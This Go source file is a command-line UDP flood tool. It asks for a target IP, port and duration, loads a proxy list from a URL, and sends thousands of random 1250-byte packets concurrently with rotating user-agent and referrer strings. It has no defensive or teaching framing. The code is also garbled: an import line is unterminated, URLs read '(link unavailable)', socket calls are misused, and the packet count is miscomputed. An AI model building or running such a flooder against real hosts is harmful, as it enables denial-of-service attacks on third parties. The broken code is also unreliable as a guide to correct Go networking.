package main

import (
	"bufio"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
  "encoding/json
)

func main() {
	fmt.Print("Enter IP: ")
	ip := getInput()
	fmt.Print("Enter port: ")
	port, _ := strconv.Atoi(getInput())
	fmt.Print("Enter duration (seconds): ")
	duration, _ := strconv.Atoi(getInput())

	proxies, err := loadProxies("(link unavailable)")
	if err != nil {
		fmt.Println(err)
		return
	}

	if len(proxies) == 0 {
		proxies = []string{"localhost:8080"}
	}

	packetContents := make([]byte, 1250)
	rand.Read(packetContents)

	userAgents := []string{"Mozilla/5.0", "Chrome/56.0.2924.87", "Safari/537.36"}
	referrers := []string{"(link unavailable)", "(link unavailable)", "(link unavailable)"}
	headers := []string{"Accept: text/html", "Accept-Language: en-US", "Cache-Control: max-age=0"}

	numPackets := int(duration * 1000)
	packetSize := 1250
	sleepTime := 10 * time.Millisecond

	var wg sync.WaitGroup

	for i := 0; i < numPackets; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			proxy := proxies[rand.Intn(len(proxies))]
			ua := userAgents[rand.Intn(len(userAgents))]
			ref := referrers[rand.Intn(len(referrers))]
			hdr := headers[rand.Intn(len(headers))]
			sendUDPPacket(proxy, ip, port, packetContents, ua, ref, hdr)
			time.Sleep(sleepTime)
		}()
	}

	wg.Wait()

	totalPackets := numPackets * len(proxies)
	totalMBs := float64(totalPackets * packetSize) / 1024 / 1024
	fmt.Printf("Sent %d packets using %d proxies, total MBs used: %.2f\n", totalPackets, len(proxies), totalMBs)
}

func loadProxies(apiLink string) ([]string, error) {
	resp, err := http.Get(apiLink)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	var proxies []string
	err = json.NewDecoder(resp.Body).Decode(&proxies)
	return proxies, err
}

func sendUDPPacket(proxy string, ip string, port int, packetContents []byte, userAgent string, referrer string, header string) {
	conn, err := net.Dial("udp", proxy)
	if err != nil {
		fmt.Println(err)
		return
	}
	defer conn.Close()

	srcPort := rand.Intn(65535)
	udpConn := conn.(*net.UDPConn)
	udpConn.SetWriteBuffer(srcPort)

	_, err = udpConn.Write(append(packetContents, []byte(userAgent+"\r\n"+referrer+"\r\n"+header+"\r\n")...))
	if err != nil {
		fmt.Println(err)
		return
	}

	addr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", ip, port))
	if err != nil {
		fmt.Println(err)
		return
	}
	_, err = udpConn.WriteToUDP(packetContents, addr)
	if err != nil {
		fmt.Println(err)
		return
	}
}

func getInput() string {
	reader := bufio.NewReader(os.Stdin)
	input, _ := reader.ReadString('\n')
	return strings.TrimSpace(input)
}

func sendUDPPacketLocal(ip string, port int, packetContents []byte) {
	conn, err := net.Dial("udp", fmt.Sprintf("%s:%d", ip, port))
	if err != nil {
		fmt.Println(err)
		return
	}
	defer conn.Close()

	_, err = conn.Write(packetContents)
	if err != nil {
		fmt.Println(err)
		return
	}
}
